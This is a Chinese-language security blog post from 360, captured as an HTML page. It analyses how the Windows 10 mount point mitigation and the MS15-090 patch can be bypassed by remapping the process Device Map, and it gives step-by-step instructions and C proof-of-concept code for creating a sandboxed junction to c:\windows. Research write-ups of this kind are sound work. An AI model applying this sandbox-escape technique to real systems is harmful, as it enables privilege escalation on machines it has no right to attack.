@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+  <title>Windows10 Mount Point Mitigation &amp; MS15-090绕过 - 360 核心安全技术博客</title>
+  <link rel="icon" href="https://blogs.360.cn/blog/20181112/upload_0f0bb5d715da5c3a2e3560e76f48fcd4.ico">
+  
+  <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="/rss.html">
+  <link rel=search type="application/opensearchdescription+xml" href="/opensearch.xml" title="360 核心安全技术博客">
+  <meta name="keywords" content="360, 技术, 前端, 后端, 服务端, 安全, 病毒, 黑客, 攻击">
+  <meta name="description" content="分享奇虎360公司的技术，与安全的互联网共同成长。"><link rel="canonical" href="https://blogs.360.cn/post/windows10-mount-point-mitigation-bypass.html" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:site" content="https://blogs.360.cn" />
+<meta name="twitter:title" content="Windows10 Mount Point Mitigation &amp; MS15-090绕过" />
+<meta name="twitter:description" content="" />
+<meta name="twitter:creator" content="mj0011" />
+<meta name="twitter:image" content="" />
+<meta name="twitter:domain" content="https://blogs.360.cn" />
+<meta property="og:url" content="https://blogs.360.cn/post/windows10-mount-point-mitigation-bypass.html" />
+<meta property="og:title" content="Windows10 Mount Point Mitigation &amp; MS15-090绕过" />
+<meta property="og:description" content="" />
+<meta property="og:image" content="" />
+  <link rel="stylesheet" href="/theme/blogs.360.cn/res/css/all.css" type="text/css" data-ls="css_firekylin">
+  
+  <style>
+    
+
+    
+    /** 隐藏列表页评论数 **/
+/** 取消代码高亮语言显示 **/
+#main .meta .comment, article pre b.name {
+  display: none;
+}
+
+/** 设置正文图片大小统一宽度 **/
+#page-post img {
+  margin: auto;
+}
+#page-post p.figure {
+  text-align: center;
+}
+/** 取消正文 center 标签样式 **/
+#page-post center {
+  text-align: left;
+}
+
+/** 正文 pre 样式修改 **/
+#page-post pre.pure {
+  background-color: #f8f8f8;
+  border: 1px solid #cccccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+  white-space: pre;
+}
+
+.hljs{display:block;overflow-x:auto;padding:0.5em;background:#272822;color:#ddd}.hljs-tag,.hljs-keyword,.hljs-selector-tag,.hljs-literal,.hljs-strong,.hljs-name{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:white}.hljs-attribute,.hljs-symbol,.hljs-regexp,.hljs-link{color:#bf79db}.hljs-string,.hljs-bullet,.hljs-subst,.hljs-title,.hljs-section,.hljs-emphasis,.hljs-type,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-addition,.hljs-variable,.hljs-template-tag,.hljs-template-variable{color:#a6e22e}.hljs-comment,.hljs-quote,.hljs-deletion,.hljs-meta{color:#75715e}.hljs-keyword,.hljs-selector-tag,.hljs-literal,.hljs-doctag,.hljs-title,.hljs-section,.hljs-type,.hljs-selector-id{font-weight:bold}
+article .entry-content pre .firekylin-code,
+article .firekylin-code > ul,
+article .firekylin-code li:nth-of-type(even),
+article .firekylin-code li:hover,
+article .firekylin-code li {
+  background-color: #272822 !important;
+  border-left: none;
+  line-height: 1.5;
+}
+  </style>
+  
+</head>
+<body>
+<nav id="sidebar" class="behavior_1">
+  <div class="wrap">
+      <div class="profile">
+          <a href="/">
+              <img src="https://blogs.360.cn/blog/20181025/upload_f2fe77d9cf177c20255844973031ff23.png" alt="360 核心安全技术博客">
+          </a>
+          <span>360 核心安全技术博客</span>
+      </div>
+      <ul class="buttons">
+          
+          <li>
+              <a class="" href="/" title="主页 Home">
+                  <i class="iconfont icon-home"></i>
+                  <span>主页 Home</span>
+              </a>
+          </li>
+          
+          <li>
+              <a class="" href="/archives" title="归档 Archive">
+                  <i class="iconfont icon-https"></i>
+                  <span>归档 Archive</span>
+              </a>
+          </li>
+          
+          <li>
+              <a class="" href="/page/cates.html" title="分类 Category">
+                  <i class="iconfont icon-archive"></i>
+                  <span>分类 Category</span>
+              </a>
+          </li>
+          
+          <li>
+              <a class="" href="/about" title="关于 About">
+                  <i class="iconfont icon-user"></i>
+                  <span>关于 About</span>
+              </a>
+          </li>
+          
+      </ul>
+      <ul class="buttons">
+        <li>
+          
+          <a class="inline" rel="nofollow" target="_blank" href="https://github.com/Qihoo360">
+            <i class="iconfont icon-github-v" title="GitHub"></i>
+          </a>
+          
+          
+            
+            <a class="inline"  rel="nofollow" target="_blank" href="https://twitter.com/360CoreSec">
+              <i class="iconfont icon-twitter-v" title="Twitter"></i>
+            </a>
+            
+            
+          
+          <a class="inline" href="/rss.html">
+            <i class="iconfont icon-rss-v" title="RSS"></i>
+          </a>
+          <a class="inline" href="/search.html">
+            <i class="iconfont icon-search" title="Search"></i>
+          </a>
+        </li>
+      </ul>
+  </div>
+</nav>
+<div id="header">
+  <div class="btn-bar"><i></i></div>
+  <h1><a href="/">360 核心安全技术博客</a></h1>
+  <a class="me" href="/about/"><img src="https://blogs.360.cn/blog/20181025/upload_f2fe77d9cf177c20255844973031ff23.png" alt="360 核心安全技术博客"></a>
+</div>
+<div id="sidebar-mask"></div>
+<div id="main">
+
+<div id="page-post">
+    <article class="post detail">
+        <div class="meta">
+            <div class="date">09月16, 2015</div>
+            <div class="comment">
+                <a href="#comments">0 comments</a>
+            </div>
+        </div>
+        <h1 class="title">Windows10 Mount Point Mitigation &amp; MS15-090绕过</h1>
+        <div class="entry-content">
+            <div class="toc"><ul>
+<li><a href="#toc-525">Symbolic Link漏洞简单背景介绍</a></li>
+<li><a href="#toc-96e">微软的缓和措施</a></li>
+<li><a href="#toc-868">针对缓和的绕过</a><ul>
+<li><a href="#toc-1e2">下面是攻击的示例关键代码：</a></li>
+</ul>
+</li>
+<li>[<img class="lazy-load" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-src="#111" alt="111"><noscript><img src="#111" alt="111"></noscript></li>
+<li><a href="#toc-367">漏洞修复</a></li>
+</ul>
+</div><h1><a id="toc-525" class="anchor" href="#toc-525"></a>Symbolic Link漏洞简单背景介绍</h1>
+<p>Symbolic Link是微软Windows系统上一项关键机制，从Windows NT3.1开始引入对象和注册表Symbolic Link后，微软从Windows2000开始也引入了NTFS Mount Point和Directory Juntions，这些机制对于熟悉Windows内部机理的技术人员并不陌生，在著名的Windows Internals系列中，也有介绍这些机制。在过去，安全人员利用Symbolic Link来攻击系统安全机制或安全软件，也并不少见。</p>
+<!--more-->
+<p>而这项技术重新火起来，要归功于2014年BlackHat上 James Forshaw爆出的大量利用mount point、注册表的符号链接来绕过IE11的EPM沙箱的事件，在此之后， James Forshaw仍在不断挖掘和通过Google Project Zero爆出大量利用这些机制的类似逻辑漏洞，通过这些漏洞可以穿透IE11的EPM沙箱，或者利用系统服务提升权限等。在2015年的Syscan上，他则以一篇《A Link to the Past: Abusing Symbolic Links on Windows》给这些漏洞和攻击方式做了更好地总结。</p>
+<p>360Vulcan Team也发现了多个使用Symbolic Link绕过EPM沙盒的漏洞，在今年的HITCON安全会议上，我们就公开了我们发现的CVE-2014-6322等沙盒绕过漏洞，包括一个未公开的EPM沙盒绕过漏洞。</p>
+<p>之所以利用Symbolic Link进行攻击的漏洞频繁出现，是和低权限程序可以操作全局对象的符号链接，使得高权限程序访问非预期的资源有重要关系的。这类漏洞不仅仅局限在Windows平台上，著名的iOS6/7越狱程序Evasion也是利用了苹果iOS系统内服务对于符号链接的处理问题实现了最初的攻击步骤。</p>
+<h1><a id="toc-96e" class="anchor" href="#toc-96e"></a>微软的缓和措施</h1>
+<p>随着这些漏洞攻击的频繁爆出，微软也在寻找更有效地缓和方式，既然低权限创建符号链接是问题的关键所在，那么封堵低权限程序创建符号链接就成了自然会想到的解决方案。</p>
+<p>在今年的五月份，Windows 10推出了内测版本Build 10120，在360安全团队进行分析后就发现，在这个版本微软就加入了针对注册表符号链接的防护，禁止”sandboxed”的低权限进程创建注册表符号链接。在随后的多个内测版本中，微软又持续加入了针对对象的符号链接创建防护和针对Mount Point（目录挂载点）链接的防护，禁止低权限的程序创建这些链接。<br>具体来说，这些防护措施修改在Windows内核程序(ntoskrnl.exe)内，在创建注册表、文件和对象的符号链接时，系统会使用RtlIsSandboxedToken来判断当前的token是否在低完整性级别或者以下（例如AppContainer)。如果是的话，针对这三种符号链接，会采取不同的策略：</p>
+<ol>
+<li><p>针对注册表符号链接： 完全禁止创建，禁止沙盒内的程序创建任何注册表符号连接</p>
+</li>
+<li><p>针对对象符号链接： 沙盒内程序可以创建对象符号链接，但是对象符号连接的Object上会增加特别的Flag，当非沙盒的程序遇到沙盒程序创建的符号链接时，符号链接不会生效</p>
+</li>
+<li><p>针对文件（Mount Point)符号链接：沙盒内程序在创建对象符号链接时，系统会检查对于被链接到的目标目录（例如将c:\test\low\链接到目标c:\windows\目录)，当前进程是否具备写入（包括写入、追加、删除、修改属性等）权限，如果不具备这些权限，或者无法打开目标目录（例如目标目录不存在），则会拒绝。</p>
+</li>
+</ol>
+<p>在Windows10 RTM正式发布后，微软又以不同寻常的速度（用James Forshaw的话来说，简直就不敢让人相信是微软干的）将这个安全缓和移植到了低版本的Windows操作系统上。<br>在今年8月11日，微软发布了MS15-090补丁，在Windows Vista\7\8\8.1及服务器操作系统上修复了CVE-2015-2428\CVE-2015-2429\CVE-2015-2430这三个漏洞，而这个补丁的实质，就是将对象、注册表、文件系统这三个符号链接的缓和防护移植到了这些操作系统上。微软这些以相当有执行力的速度，试图将这类漏洞彻底终结，送入历史之中。</p>
+<p>那么，是不是对于Windows 10，包括打了8月补丁的Windows7, 8, 8.1等操作系统，这些符号链接的漏洞就和我们永远说拜拜了呢？</p>
+<p>答案当然是否定的，就如James Forshaw在44CON的议题标题所说， 2 Steps Forward, 1 Step Back，在开发这些缓和措施的过程中，水平不到位的安全/开发人员，也会犯这样那样的错误，使得我们在深入研究和分析这些机制后，仍然可能找出突破他们的方式。</p>
+<h1><a id="toc-868" class="anchor" href="#toc-868"></a>针对缓和的绕过</h1>
+<p>在这里，本文就是要介绍一种绕过Windows 10 Mount Point Mitigation（目录挂载点缓和）的方式，由于这个缓和在Windows7/8/8.1等系统上是通过MS15-090得到修复的，因此这里介绍的方法也是对MS15-090（CVE-2015-2430）的绕过攻击方式。</p>
+<p>前面我们说到，针对文件/目录的Mount Point符号链接，系统并没有彻底禁止沙盒的程序去创建它们，而是会检查对应被链接到的目标目录，当前进程是否具备可写的权限，如果可写（例如我们将同是位于低完整性级别目录下的两个继承目录进行链接），链接是可以被创建的。这就给我们突破这个防护提供了一个攻击面，那么我们来看看这个检查具体是怎么实现的呢？</p>
+<p>这个检查的代码是位于IopXxxControlFile中的，内核调用NtDeviceIoControl和NtFsControlFile最终都要调用到这个函数中，这个函数负责为设备调用封装IRP并进行IRP发送工作，FSCTL_SET_REPARSE_POINT这个用于设置NTFS Mount Point的设备控制码自然也不例外。在这个函数中，微软增加了针对FSCTL_SET_REPARSE_POINT的特殊检查处理，逻辑并不复杂，这里我列出如下：</p>
+<pre><code class="hljs lang-cpp"><span class="hljs-keyword">if</span> ( IoControlCode == FSCTL_SET_REPARSE_POINT ) 
+{
+     ReparseBuffer = Irp_1-&gt;AssociatedIrp.SystemBuffer;
+     <span class="hljs-keyword">if</span> ( InputBufferLength &gt;= <span class="hljs-number">4</span> &amp;&amp; ReparseBuffer-&gt;ReparseTag == IO_REPARSE_TAG_MOUNT_POINT )
+     {
+       SubjectSecurityContext.ClientToken = <span class="hljs-number">0</span>;
+       SubjectSecurityContext.ImpersonationLevel = <span class="hljs-number">0</span>;
+       SubjectSecurityContext.PrimaryToken = <span class="hljs-number">0</span>;
+       SubjectSecurityContext.ProcessAuditId = <span class="hljs-number">0</span>;
+       bIsSandboxedProcess = CurrentThread;
+       CurrentProcess = IoThreadToProcess(CurrentThread);
+       SeCaptureSubjectContextEx(bIsSandboxedProcess, CurrentProcess, &amp;SubjectSecurityContext);
+       LOBYTE(bIsSandboxedProcess) = RtlIsSandboxedToken(&amp;SubjectSecurityContext, AccessMode[<span class="hljs-number">0</span>]);
+       status = SeReleaseSubjectContext(&amp;SubjectSecurityContext);
+       <span class="hljs-keyword">if</span> ( bIsSandboxedProcess )
+       {
+          status_1 = FsRtlValidateReparsePointBuffer(InputBufferLength, ReparseBuffer);
+          <span class="hljs-keyword">if</span> ( status_1 &lt; <span class="hljs-number">0</span> )
+          {
+             IopExceptionCleanup(Object, Irp_1, *&amp;v79[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);
+             <span class="hljs-keyword">return</span> status_1;
+           }
+           NameLength = ReparseBuffer-&gt;MountPointReparseBuffer.SubstituteNameLength;
+           MaxLen = NameLength;
+           NameBuffer = ReparseBuffer-&gt;MountPointReparseBuffer.PathBuffer;
+           ObjectAttributes.Length = <span class="hljs-number">24</span>;
+           ObjectAttributes.RootDirectory = <span class="hljs-number">0</span>;
+           ObjectAttributes.Attributes = OBJ_FORCE_ACCESS_CHECK | OBJ_KERNEL_HANDLE
+           ObjectAttributes.ObjectName = &amp;NameLength;
+           ObjectAttributes.SecurityDescriptor = <span class="hljs-number">0</span>;
+           ObjectAttributes.SecurityQualityOfService = <span class="hljs-number">0</span>;
+           status_2 = ZwOpenFile(&amp;FileHandle, 
+                                  <span class="hljs-number">0x120116</span>u,
+                                  &amp;ObjectAttributes,
+                                  &amp;IoStatusBlock,
+                                  FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
+                                  FILE_DIRECTORY_FILE);
+           <span class="hljs-keyword">if</span> ( status_2 &lt; <span class="hljs-number">0</span> )
+           {
+              IopExceptionCleanup(Object, Irp_1, *&amp;v79[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);
+              <span class="hljs-keyword">return</span> status_2;
+           }
+           status = ZwClose(FileHandle);
+     }
+}
+
+
+
+</code></pre>
+<p>通过这段代码我们可以看到， 当IoControlCode为FSCTL_SET_REPARSE_POINT时，函数会检查ReparseTag是否为IO_REPARSE_TAG_MOUNT_POINT，如果是Mount Point的操作，接下来就会使用RtlIsSandboxedToken来检查当前进程是否是沙盒进程，如果是沙盒进程，在使用FsRtlValidateReparsePointBuffer检查reparse point的缓存数据格式后（这个函数在文件系统驱动处理reparse point操作时也会用到），将目标目录的路径提取出来，使用ZwOpenFile尝试打开它， 如果无法打开，就返回拒绝。</p>
+<p>这里打开文件有个很关键的步骤，大家可以看到代码里ObjectAttributes.Attributes设置了包含OBJ_FORCE_ACCESS_CHECK标志。这里就是要求 ZwOpenFile 去强制检查当前进程是否有权限打开这个目录，否则ZwOpenFile通过内核模式转换后，是直接无视权限检查的。</p>
+<p>这个检查似乎很严密，我们如何突破呢？笔者仔细研究了下相关的机制，本来想看看是否能通过在PathBuffer中调换SubsituteName和PrintName位置的方式（这段代码默认SubsituteName在前）来欺骗检查逻辑，但后来发现FsRtlValidateReparsePointBuffer的预检查中，已经强制要求了SubsituteName必须在前。</p>
+<p>再深入看看Ntfs和Ntos针对Set Reparse Point的实现，笔者发现Reparse Point具体的目标对象的解析和处理并不是在ntfs中当前进程完成的，ntfs在收到set reparse point的file system control请求后，只是将这个信息以文件系统结构存储起来，而直到访问这个mount point的程序去访问对应的路径时，ntos的IO子系统才会去处理和解析相关的数据，也就是说，我们当前进程发送过去的路径， 是并不在当前进程中具体去处理的，也就是说，它在当前进程里是可以无效或必并不指向我们原先想要的目标的。</p>
+<p>根据这个事实，就不难想出，我们可以让这里的ZwOpenFile在我们的进程里，打开的其实并非c:\windows的目录，而这个路径在外面的进程看起来，则需要时真正的c:\windows。</p>
+<p>笔者稍微复习了下IO子系统的代码，很快就想出了对应的欺骗技巧：Device Map</p>
+<p>进程的Device Map是针对系统中的进程设置“虚拟DOS设备路径”的系统机制， 它可以通过NtSetInformationProcess/NtQueryInformationProcess的ProcessDeviceMap功能号来设置和查询。</p>
+<p>当系统内核打开一个诸如c:\windows的DOS路径时，NTDLL会首先将其前面加上\??\，使其变为一个NT路径：\??\c:\windows ，通常来说\??\指向\GLOBAL??\，而\GLOBAL??\下就有C:这个指向\Device\HarddiskVolumeX等磁盘分区设备的符号链接，使得最终系统的对象子系统能够找到对应的文件系统驱动发送相关的文件操作请求。</p>
+<p>而Device Map的修改机制，允许我们将\??\指向其他的对象目录，在ProcessDeviceMap中，我们只要填写对应的对象目录句柄，就可以将当前进程（或者被设置的对应进程）的\??\映射到我们的对象目录中，例如将 \??\不再指向\GLOBAL??\，而是\BaseNamedObjects。这项机制允许程序具备多个虚拟的\??\根目录，这被Windows自己的内核机制例如WindowStation管理机制所使用。</p>
+<p>而在这里，我们正好就可以使用这个技巧，来绕过ZwOpenFile的安全检查，步骤如下：</p>
+<p>（假设我们用于测试的低权限可访问目录为c:\users\test\desktop\low)</p>
+<ol>
+<li><p>创建c:\users\test\desktop\low\windows目录，这个目录我们可以访问，另外在low下在创建一个任意名字的目录用来链接Windows目录，例如叫做Low\demo目录，这里之所以要先创建，是因为我们后面要修改系统默认DOS设备根目录，再使用win32 api操作文件会比较麻烦</p>
+</li>
+<li><p>将当前Device Map即\??\通过NtSetInformationProcess映射到一个我们可写的对象目录，例如对于低完整性进程，\Session\X\BaseNamedObjects对象目录就可以，我们可以将其映射到这个目录来</p>
+</li>
+<li><p>在\Session\X\BaseNamedObjects对象目录下创建一个对象符号链接，名为C: , 链接到\GLOBAL??\c:\users\test\desktop\low，注意这里必须要用GLOBAL??而不是\??\因为默认的\??\已经被我们改到别的地方了</p>
+</li>
+</ol>
+<p>这里的对象符号链接是我们当前进程自己用的，按前面说的，沙盒内的符号链接只有沙盒进程能用，所以是没有问题的。</p>
+<ol start="4">
+<li><p>此时，当前进程的\??\c:\windows，实际变成了\BaseNamedObjects\c:\windows，而因为\BaseNamedObjects下面的C:是我们设置好的符号链接，因此这个路径最终会被解析为\GLOBAL??\C:\users\test\desktop\low\windows，也就是我们在第一步里创建的那个我们可以访问的Windows目录</p>
+</li>
+<li><p>最后，为low下的demo目录创建链接到\??\c:\windows，这里IopXxxControlFile在使用ZwOpenFile进行权限检查时，自然就检查到了我们设置的欺骗目录，并认为我们具备对这个目录的写入权限，从而允许创建。</p>
+</li>
+<li><p>然而，在创建完成Mount Point后，这个路径信息已经被载入文件系统中， 其他进程再来访问时，会发现这个demo目录指向真正的\??\c:\windows目录， 我们成功实现绕过Mount Point缓和，创建有效的低权限可访问的、链接到高权限目录的符号链接。</p>
+</li>
+</ol>
+<h2><a id="toc-1e2" class="anchor" href="#toc-1e2"></a>下面是攻击的示例关键代码：</h2>
+<pre><code class="lang-c#">CreateDirectory(&quot;c:\\users\\test\\desktop\\low\\windows&quot; , 0 )
+CreateDirectory(&quot;c:\\users\\test\\desktop\\low\\demo&quot; , 0)
+HANDLE hlink = CreateFile(&quot;c:\\users\\test\\desktop\\low\\demo&quot; , GENERIC_WRITE , FILE_SHARE_READ , 0 , OPEN_EXISTING , FILE_FLAG_BACKUP_SEMANTICS, 0 );
+NtOpenDirectoryObject(&amp;hObjDir , DIRECTORY_TRAVERSE , &amp;oba); 
+//&quot;\\Sessions\\1\\BaseNamedObjects&quot;
+NtSetInformationProcess(GetCurrentProcess() , ProcessDeviceMap , &amp;hObjDir ,sizeof(HANDLE));
+NtCreateSymbolicLinkObject(&amp;hObjLink , LINK_QUERY , &amp;oba2 , &amp;LinkTarget) ; 
+//oba2: &quot;\\??\\c:&quot; link target:&quot;\\GLOBAL??\\C:\\users\ \test\\desktop\\low&quot;
+
+WCHAR NtPath[MAX_PATH] = L&quot;\\??\\C:\\WINDOWS\\&quot;;
+WCHAR wdospath[MAX_PATH] = L&quot;c:\\windows\\&quot;;
+
+DWORD btr ; 
+PREPARSE_DATA_BUFFER pBuffer;
+DWORD buffsize ;
+pBuffer = (PREPARSE_DATA_BUFFER)malloc(sizeof(REPARSE_DATA_BUFFER) + (wcslen(NtPath) + wcslen(wdospath)) * 2 + 2);
+
+pBuffer-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+pBuffer-&gt;ReparseDataLength = sizeof(REPARSE_DATA_BUFFER) + (wcslen(NtPath) + wcslen(wdospath)) * 2 - 8 ;
+pBuffer-&gt;Reserved = 0 ; 
+pBuffer-&gt;MountPointReparseBuffer.SubstituteNameLength = wcslen(NtPath) * 2 ;
+pBuffer-&gt;MountPointReparseBuffer.SubstituteNameOffset = 0 ; 
+pBuffer-&gt;MountPointReparseBuffer.PrintNameLength = wcslen(wdospath) * 2 ;
+pBuffer-&gt;MountPointReparseBuffer.PrintNameOffset = wcslen(NtPath) * 2 + 2 ; 
+memcpy((PCHAR)pBuffer-&gt;MountPointReparseBuffer.PathBuffer , (PCHAR)NtPath , wcslen(NtPath) * 2 + 2);
+memcpy((PCHAR)((PCHAR)pBuffer-&gt;MountPointReparseBuffer.PathBuffer + wcslen(NtPath) * 2 + 2) ,
+ (PCHAR)wdospath ,
+ wcslen(wdospath) * 2 + 2) ; 
+buffsize = sizeof(REPARSE_DATA_BUFFER) + (wcslen(NtPath) + wcslen(wdospath)) * 2 ;
+
+DeviceIoControl(hlink , FSCTL_SET_REPARSE_POINT , pBuffer , buffsize, NULL , 0 , &amp;btr , 0 );
+</code></pre>
+<p>测试程序成功的截图如下：</p>
+<p>可以看到低权限的poc_mklink成功创建目录1，链接到c:\windows的junction。</p>
+<h1><a id="toc-bd6" class="anchor" href="#toc-bd6"></a><a href="http://blogs.360.cn/wp-content/uploads/2015/09/111.png"><img class="lazy-load" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-src="http://blogs.360.cn/wp-content/uploads/2015/09/111.png" alt="111"><noscript><img src="http://blogs.360.cn/wp-content/uploads/2015/09/111.png" alt="111"></noscript></a></h1>
+<h1><a id="toc-367" class="anchor" href="#toc-367"></a>漏洞修复</h1>
+<p>这个问题的本质和TOCTTOU类似，检查的时机和状态，同使用无法完全一致导致。 从攻击手法来说，微软可以继续封堵沙盒进程修改DeviceMap，这是比较简单也容易想到的办法，但是可能还会有其他方式绕过ZwOpenFile，想要沿用当前的防御策略，完美地防护Mount Point是并不容易的：）</p>
+ </div> <p>本文链接：<a href="https://blogs.360.cn/post/windows10-mount-point-mitigation-bypass.html">https://blogs.360.cn/post/windows10-mount-point-mitigation-bypass.html</a></p>
+            <p>-- <acronym title="End of File">EOF</acronym> --</p>
+
+            <div class="post-info">
+                <p>
+                    作者
+                    
+                    <a href="/author/mj0011" data-user="mj0011">
+                        <code class="notebook">mj0011</code>
+                    </a>
+
+                    发表于
+                    <i>2015-09-16 22:00:15</i>
+
+                    
+                    ，添加在分类
+                    
+                    <a href="/cate/漏洞分析" data-cate="漏洞分析">
+                        <code class="notebook">漏洞分析</code>
+                    </a>
+                    
+                    下
+                    
+
+                    
+
+                    ，最后修改于
+                    <i>2018-08-14 13:13:03</i>
+                </p>
+                
+                <p><div class="bdsharebuttonbox"><a href="#" class="bds_more" data-cmd="more">分享到：</a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博">新浪微博</a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信">微信</a><a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter">Twitter</a><a href="#" class="bds_evernotecn" data-cmd="evernotecn" title="分享到印象笔记">印象笔记</a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友">QQ好友</a><a href="#" class="bds_youdao" data-cmd="youdao" title="分享到有道云笔记">有道云笔记</a></div></p>
+                
+            </div>
+    </article>
+    
+    <nav class="pagination">
+        
+        <a href="/post/hoook007.html" class="prev">&laquo; 罪恶家族hook007之潜伏篇</a>
+        
+
+        
+        <a href="/post/vnc拒绝服务漏洞cve-2015-5239分析.html" class="next">VNC拒绝服务漏洞(CVE-2015-5239)分析 &raquo;</a>
+        
+    </nav>
+    
+    
+    <div id="comments" data-type="custom" data-thread-key="d41d8cd98f00b204e9800998ecf8427e" data-url="https://blogs.360.cn/post/windows10-mount-point-mitigation-bypass.html">
+    <h1 class="title">Comments</h1>
+    
+
+      
+      <!---->
+      
+    
+</div>
+
+    
+</div>
+
+<footer id="footer" class="inner">
+  &copy; 2020&nbsp;-&nbsp; 360 核心安全技术博客
+  
+    &nbsp;-&nbsp;<a href="/">blogs.360.cn</a>
+  
+  <br />
+  Powered by&nbsp;<a target="_blank" href="https://thinkjs.org">ThinkJS</a>&nbsp;&amp;&nbsp;<a target="_blank" rel="nofollow" class="external" href="https://firekylin.org">FireKylin 1.3.1</a>
+</footer>
+</div>
+<script src="/theme/blogs.360.cn/res/js/firekylin.js" data-ls="js_firekylin"></script>
+
+  <!--<script>
+(function(b,a,e,h,f,c,g,s){b[h]=b[h]||function(){(b[h].c=b[h].c||[]).push(arguments)};
+b[h].s=!!c;g=a.getElementsByTagName(e)[0];s=a.createElement(e);
+s.src="//s.union.360.cn/"+f+".js";s.defer=!0;s.async=!0;g.parentNode.insertBefore(s,g)
+})(window,document,"script","_qha",299978,false);
+</script>
+<script>
+(function(b,a,e,h,f,c,g,s){b[h]=b[h]||function(){(b[h].c=b[h].c||[]).push(arguments)};
+b[h].s=!!c;g=a.getElementsByTagName(e)[0];s=a.createElement(e);
+s.src="//s.union.360.cn/"+f+".js";s.defer=!0;s.async=!0;g.parentNode.insertBefore(s,g)
+})(window,document,"script","_qha",300084,false);
+</script>-->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-137484248-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-137484248-1');
+</script>
+
+<script>if(location.protocol !== 'https:') {
+  window._bd_share_config={
+    "common":{
+      "bdSnsKey":{},
+      "bdText":"",
+      "bdMini":"2",
+      "bdMiniList":false,
+      "bdPic":"",
+      "bdStyle":"1",
+      "bdSize":"16"
+    },
+    "share":{
+      "bdSize":16
+    },
+    "image":{
+      "viewList":["tsina","weixin","twi","evernotecn","sqq","youdao"],
+      "viewText":"分享到：",
+      "viewSize":"16"
+    }
+  };
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+}
+
+//微信分享
+function wxload(src) {
+	return new Promise(function(resolve, reject) {
+		var s = document.createElement('script');
+		s.onload = resolve;
+		s.onerror = reject;
+		s.src = src;
+      	document.body.appendChild(s);
+	});
+}
+
+function wxjsonp(src) {
+  let cbName = 'wxjsonpcb';
+  if(window[cbName]) {
+    cbName += cbName;
+  }
+  
+  let url = 'https://misc.hao.360.cn/weixin/api?format=json&appKey=360Blogs:360blog:360blog&url='+encodeURIComponent(location.href.split('#')[0])+'&_callback='+cbName;
+  return new Promise(function(resolve, reject) {
+  	window[cbName] = resolve;
+    wxload(url).then(null, reject);
+  });
+}
+
+function wxshare(wxData) {
+    // 第一步：通过通用服务获取config数据
+    function getWxConfig() {
+      	wxjsonp().then(function(result){
+          bindWxEvent(result.data);
+        });
+    }
+
+    function bindWxEvent(config) {
+        wx.config({
+          debug: location.search.indexOf('wxdebug=1') > 0,
+          appId: config.appId,
+          timestamp: config.timestamp,
+          nonceStr: config.nonceStr,
+          signature: config.signature,
+          jsApiList: [
+            'checkJsApi',
+            'onMenuShareTimeline',
+            'onMenuShareAppMessage',
+            'onMenuShareQQ',
+            'onMenuShareWeibo',
+            'hideMenuItems',
+            'showMenuItems',
+            'hideAllNonBaseMenuItem',
+            'showAllNonBaseMenuItem'
+          ]
+        });
+ 
+
+        wx.ready(function () {
+            wx.onMenuShareTimeline({
+                title: wxData.desc, // 分享标题
+                link: wxData.link, // 分享链接
+                imgUrl: wxData.imgUrl, // 分享图标
+                success: function () {
+                    // 用户确认分享后执行的回调函数
+                },
+                cancel: function () {
+                    // 用户取消分享后执行的回调函数
+                }
+            });
+            wx.onMenuShareAppMessage({
+                title: wxData.title,
+                desc: wxData.desc,
+                link: wxData.link,
+                imgUrl: wxData.imgUrl,
+                trigger: function (res) {
+                },
+                success: function (res) {
+                },
+                cancel: function (res) {
+                },
+                fail: function (res) {
+                }
+            });
+        });
+    }
+ 
+ 	getWxConfig();
+}
+
+wxload('https://res.wx.qq.com/open/js/jweixin-1.0.0.js').then(function() {
+	const avatar = document.querySelector('.profile img');
+  	const content = document.querySelector('#page-post p');
+  	const descMeta = document.querySelector('meta[name=description]');
+  	return wxshare({
+      imgUrl: avatar.src,
+      link: location.href,
+      title: document.title,
+      desc: content ? content.innerText : descMeta.content
+	});	
+})</script>
+
+</body>
+</html>
